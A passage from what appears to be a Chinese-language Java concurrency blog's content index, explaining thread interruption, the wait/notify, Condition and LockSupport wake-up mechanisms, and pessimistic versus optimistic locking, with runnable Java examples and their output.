class="keyword">private</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">isInterrupted</span><span class="params">(<span class="type">boolean</span> ClearInterrupted)</span>;</span><br></pre></td></tr></table></figure><ul><li><p>它们在底层都调用了native方法<code>isInterrupted</code>，方法的注释也清晰的表达了“中断状态将会根据传入的ClearInterrupted参数值确定是否重置”。</p></li><li><p>所以，静态方法interrupted将会清除中断状态（传入的参数ClearInterrupted为true），实例方法isInterrupted则不会（传入的参数ClearInterrupted为false）。</p></li></ul><h1 id="线程等待唤醒机制"><a href="#线程等待唤醒机制" class="headerlink" title="线程等待唤醒机制"></a>线程等待唤醒机制</h1><p>3种让线程等待和唤醒的方法：</p><ol><li><p>使用Object中的wait()方法让线程等待，使用Object中的notify()方法唤醒线程</p></li><li><p>使用JUC包中Condition的await()方法让线程等待，使用signal()方法唤醒线程</p></li><li><p>LockSupport类的<code>park()</code>和<code> unpark()</code> 的作用分别是阻塞线程和解除阻塞线程</p></li></ol><hr><h2 id="Object类中的wait和notify方法"><a href="#Object类中的wait和notify方法" class="headerlink" title="Object类中的wait和notify方法"></a>Object类中的wait和notify方法</h2><ul><li>wait和notify方法必须要在<strong>同步</strong>块或者方法里面，且<strong>成对</strong>出现使用</li><li>先wait后notify才OK</li></ul><p>正常：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">objectLock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (objectLock) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t ---- come in&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    objectLock.wait();<span class="comment">//----------------------这里先让他等待</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;---被唤醒了&quot;</span>);</span><br><span class="line">        &#125;, <span class="string">&quot;t1&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//暂停几秒钟线程</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.SECONDS.sleep(<span class="number">3L</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (objectLock) &#123;</span><br><span class="line">                objectLock.notify();<span class="comment">//-------------------------再唤醒它</span></span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t ---发出通知&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;t2&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p>t1 —- come in<br>t2 —发出通知<br>t1—被唤醒了</p><hr><p>异常1 — 去掉synchronized：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">objectLock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="comment">//    synchronized (objectLock) &#123;</span></span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t ---- come in&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                objectLock.wait();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//      &#125;</span></span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;---被唤醒了&quot;</span>);</span><br><span class="line">        &#125;, <span class="string">&quot;t1&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//暂停几秒钟线程</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.SECONDS.sleep(<span class="number">3L</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="comment">//     synchronized (objectLock) &#123;</span></span><br><span class="line">            objectLock.notify();</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t ---发出通知&quot;</span>);</span><br><span class="line">            <span class="comment">//     &#125;</span></span><br><span class="line">        &#125;, <span class="string">&quot;t2&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p>t1 —- come in<br>Exception in thread “t1” java.lang.IllegalMonitorStateException<br>    at java.lang.Object.wait(Native Method)<br>    at java.lang.Object.wait(Object.java:502)<br>    at Main.lambda$main$0(Main.java:11)<br>    at java.lang.Thread.run(Thread.java:748)<br>Exception in thread “t2” java.lang.IllegalMonitorStateException<br>    at java.lang.Object.notify(Native Method)<br>    at Main.lambda$main$1(Main.java:28)<br>    at java.lang.Thread.run(Thread.java:748)</p><hr><p>异常2 — 把notify和wait的执行顺序对换：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">objectLock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">synchronized</span> (objectLock) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t ---- come in&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    objectLock.wait();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;---被唤醒了&quot;</span>);</span><br><span class="line">        &#125;, <span class="string">&quot;t1&quot;</span>).start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (objectLock) &#123;</span><br><span class="line">                objectLock.notify();<span class="comment">//这个先执行了</span></span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t ---发出通知&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;t2&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果（程序一直在等待）：</p><p>t2 —发出通知<br>t1 —- come in</p><hr><h2 id="Condition接口中的await和signal方法"><a href="#Condition接口中的await和signal方法" class="headerlink" title="Condition接口中的await和signal方法"></a>Condition接口中的await和signal方法</h2><ul><li>Condition中的线程等待和唤醒方法，需要先获取锁</li><li>一定要先await后signal，不能反了</li></ul><p>正常：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Lock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line">        <span class="type">Condition</span> <span class="variable">condition</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            lock.lock();</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName()+<span class="string">&quot;\t-----come in&quot;</span>);</span><br><span class="line">                condition.await();</span><br><span class="line">                System.out.println(Thread.currentThread().getName()+<span class="string">&quot;\t -----被唤醒&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                lock.unlock();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;t1&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//暂停几秒钟线程</span></span><br><span class="line">        <span class="keyword">try</span> &#123; TimeUnit.SECONDS.sleep(<span class="number">1</span>); &#125; <span class="keyword">catch</span> (InterruptedException e) &#123; e.printStackTrace(); &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            lock.lock();</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                condition.signal();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                lock.unlock();</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(Thread.currentThread().getName()+<span class="string">&quot;\t&quot;</span>+<span class="string">&quot;我要进行唤醒&quot;</span>);</span><br><span class="line">        &#125;,<span class="string">&quot;t2&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p>t1—–come in<br>t2我要进行唤醒<br>t1 —–被唤醒</p><blockquote><p>异常与Object的类似：先唤醒后等待；缺少lock</p></blockquote><hr><h2 id="LockSupport类中的park和unpark方法"><a href="#LockSupport类中的park和unpark方法" class="headerlink" title="LockSupport类中的park和unpark方法"></a>LockSupport类中的park和unpark方法</h2><p>Object和Condition使用的限制条件：</p><ul><li>线程先要获得并持有锁，必须在锁块（synchronized或lock）中</li><li>必须要先等待后唤醒，线程才能够被唤醒</li></ul><hr><p>LockSupport是用来创建锁和其他同步类的基本线程阻塞原语。</p><p>LockSupport类使用了一种名为Permit（许可）的概念来做到阻塞和唤醒线程的功能， 每个线程都有一个许可(permit)，permit只有两个值1和零，默认是零。可以把许可看成是一种(0,1)信号量（Semaphore），但与 Semaphore 不同的是，<strong>许可的累加上限是1</strong>。</p><p>正常：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t----------come in&quot;</span>);</span><br><span class="line">            LockSupport.park();</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t----------被唤醒了&quot;</span>);</span><br><span class="line">        &#125;, <span class="string">&quot;t1&quot;</span>);</span><br><span class="line">        t1.start();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//暂停几秒钟线程</span></span><br><span class="line">        <span class="keyword">try</span> &#123; TimeUnit.SECONDS.sleep(<span class="number">3</span>); &#125; <span class="keyword">catch</span> (InterruptedException e) &#123; e.printStackTrace(); &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            LockSupport.unpark(t1);</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t-----发出通知，去唤醒t1&quot;</span>);</span><br><span class="line">        &#125;, <span class="string">&quot;t2&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p>t1———-come in<br>t2—–发出通知，去唤醒t1<br>t1———-被唤醒了</p><hr><p>之前错误的先唤醒后等待，LockSupport照样支持：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                TimeUnit.SECONDS.sleep(<span class="number">3</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t----------come in&quot;</span> + <span class="string">&quot;\t&quot;</span> + System.currentTimeMillis());</span><br><span class="line">            LockSupport.park();</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t----------被唤醒了&quot;</span> + <span class="string">&quot;\t&quot;</span> + System.currentTimeMillis());</span><br><span class="line">        &#125;, <span class="string">&quot;t1&quot;</span>);</span><br><span class="line">        t1.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            LockSupport.unpark(t1);</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t-----发出通知，去唤醒t1&quot;</span>);</span><br><span class="line">        &#125;, <span class="string">&quot;t2&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p>t2—–发出通知，去唤醒t1<br>t1———-come in1665242288963<br>t1———-被唤醒了1665242288963</p><blockquote><p>sleep方法3秒后醒来，执行park无效，没有阻塞效果，解释如下。先执行了unpark(t1)导致上面的park方法形同虚设无效，<strong>时间是一样的</strong><br>类似于高速公路的ETC，提前买好了通行证unpark，到闸机处直接抬起栏杆放行了，没有park拦截了。</p></blockquote><hr><p>许可的累加上限是1：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                TimeUnit.SECONDS.sleep(<span class="number">3</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t----------come in&quot;</span> + <span class="string">&quot;\t&quot;</span> + System.currentTimeMillis());</span><br><span class="line">            LockSupport.park();</span><br><span class="line">            LockSupport.park();</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t----------被唤醒了&quot;</span> + <span class="string">&quot;\t&quot;</span> + System.currentTimeMillis());</span><br><span class="line">        &#125;, <span class="string">&quot;t1&quot;</span>);</span><br><span class="line">        t1.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            LockSupport.unpark(t1);</span><br><span class="line">            LockSupport.unpark(t1);</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t-----发出通知，去唤醒t1&quot;</span>);</span><br><span class="line">        &#125;, <span class="string">&quot;t2&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果（程序一直运行着）：</p><p>t2—–发出通知，去唤醒t1<br>t1———-come in1665242531610</p><p>总结：</p><ul><li><p>LockSupport是一个线程阻塞工具类， 所有的方法都是静态方法， 可以让线程在任意位置阻塞， 阻塞之后也有对应的唤醒方法。归根结底， LockSupport调用的<code>Unsafe</code>中的native代码。</p></li><li><p>LockSupport提供<code>park()</code>和<code>unpark()</code> 方法实现阻塞线程和解除线程阻塞的过程</p></li><li><p>LockSupport和每个使用它的线程都有一个许可(permit) 关联。每个线程都有一个相关的permit， permit<strong>最多只有一个</strong>， 重复调用<code>unpark()</code>也不会积累凭证。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> JUC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中断机制 </tag>
            
            <tag> LockSupport </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多线程锁</title>
      <link href="/posts/5815/"/>
      <url>/posts/5815/</url>
      
        <content type="html"><![CDATA[<h1 id="悲观锁"><a href="#悲观锁" class="headerlink" title="悲观锁"></a>悲观锁</h1><p>定义：悲观锁认为自己在使用数据的时候一定有别的线程来修改数据，因此在获取数据的时候会先加锁，确保数据不会被别的线程修改。</p><p>实现方式：<strong>synchronized关键字</strong>和<strong>Lock的实现类</strong>都是悲观锁</p><p>适用场景：写操作多的场景，先加锁可以保证写操作时数据正确，显示的锁定之后再操作同步资源。</p><p>伪代码说明：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//=============悲观锁的调用方式</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">m1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//加锁后的业务逻辑......</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保证多个线程使用的是同一个lock对象的前提下</span></span><br><span class="line"><span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">m2</span><span class="params">()</span> &#123;</span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 操作同步资源</span></span><br><span class="line">    &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="乐观锁"><a href="#乐观锁" class="headerlink" title="乐观锁"></a>乐观锁</h1><p>定义：乐观锁认为自己在使用数据时<strong>不会有别的线程修改数据</strong>，所以不会添加锁，只是在更新数据的时候去判断之前有没有别的线程更新了这个数据。如果这个数据没有被更新，当前线程将自己修改的数据成功写入；如果数据已经被其他线程更新，则根据不同的实现方式执行不同的操作。</p><p>实现方式（乐观锁在Java中是通过使用无锁编程来实现）：</p><ul><li><p>版本号机制Version（只要有人提交了就会修改版本号，可以解决ABA问题）：</p><ul><li>ABA问题：在CAS中想读取一个值A，想把值A变为C，不能保证读取时的A就是赋值时的A，中间可能有个线程将A变为B再变为A。</li><li>解决方法：Juc包提供了一个<code>AtomicStampedReference</code>，原子更新带有版本号的引用类型，通过控制版本值的变化来解决ABA问题。</li></ul></li><li><p>最常采用的是CAS（Compare-and-Swap，即比较并替换）算法，Java原子类中的递增操作就通过CAS自旋实现的。</p></li></ul><p>伪代码说明：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//=============乐观锁的调用方式</span></span><br><span class="line"><span class="comment">// 保证多个线程使用的是同一个AtomicInteger</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">AtomicInteger</span> <span class="variable">atomicInteger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicInteger</span>();</span><br><span class="line">atomicInteger.incrementAndGet();</span><br></pre></td></tr></table></figure><h1 id="synchronized"><a href="#synchronized" class="headerlink" title="synchronized"></a>synchronized</h1><h2 id="三种实现方式"><a href="#三种实现方式" class="headerlink" title="三种实现方式"></a>三种实现方式</h2><ul><li>作用于实例方法，当前实例加锁，进入同步代码前要获得当前实例的锁；</li><li>作用于代码块，对括号里配置的对象加锁。</li><li>作用于静态方法，当前类加锁，进去同步代码前要获得当前<strong>类对象</strong>的锁；</li></ul><h2 id="从字节码角度分析synchronized实现"><a href="#从字节码角度分析synchronized实现" class="headerlink" title="从字节码角度分析synchronized实现"></a>从字节码角度分析synchronized实现</h2><blockquote><p>文件反编译技巧：</p><ul><li>文件反编译<code>javap -c ***.class</code>文件反编译，-c表示对代码进行反汇编</li><li>假如需要更多信息 <code>javap -v ***.class</code> ，-v即-verbose输出附加信息（包括行号、本地变量表、反汇编等详细信息）</li></ul></blockquote><p>下面是三种实现方式的case：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">m1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (o) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;------hello synchronized m1&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">m2</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;------hello synchronized m2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">m3</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;------hello synchronized m3&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反编译的结果：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 